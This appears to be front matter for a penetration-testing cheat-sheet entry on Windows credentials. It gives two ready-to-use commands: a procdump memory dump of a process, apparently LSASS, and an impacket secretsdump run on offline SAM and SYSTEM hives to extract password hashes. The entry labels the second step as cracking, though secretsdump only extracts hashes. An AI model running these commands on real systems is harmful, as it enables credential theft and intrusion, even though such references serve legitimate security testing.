---
layout: post
title: "Windows Creds"
tags: ["SAM","LSASS","Secrets"]
os: ["Windows"]
code:
  - title: Dump hashes
    description:
    sample: .\procdump64.exe -accepteula -ma 580 out.dmp2
  - title: Crack offline SAM accounts
    sample: python secretsdump.py -system "systemfile" -sam "samfile"  LOCAL
---
